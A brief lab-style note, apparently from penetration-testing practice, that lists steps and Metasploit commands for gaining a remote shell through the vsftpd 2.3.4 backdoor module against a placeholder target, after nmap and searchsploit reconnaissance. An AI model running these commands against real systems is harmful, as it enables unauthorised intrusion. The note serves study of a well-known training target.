
	perform  a remote code execution and gaining reverse shell


## expliot chain:
	
	1. search in nmap with -sC and -sV 
	2. searchsploit search
	3. search in metasploit
	4. choose exploit
	5. set parameter
	6. run




## commands:

	1. msfconsole 
	2. search vsftpd 
	3. use exploit/unix/ftp/vsftpd_234_backdoor 
	4. set RHOST [target-ip ]
	5. set RPORT 21 
	6. show options
	7. exploit
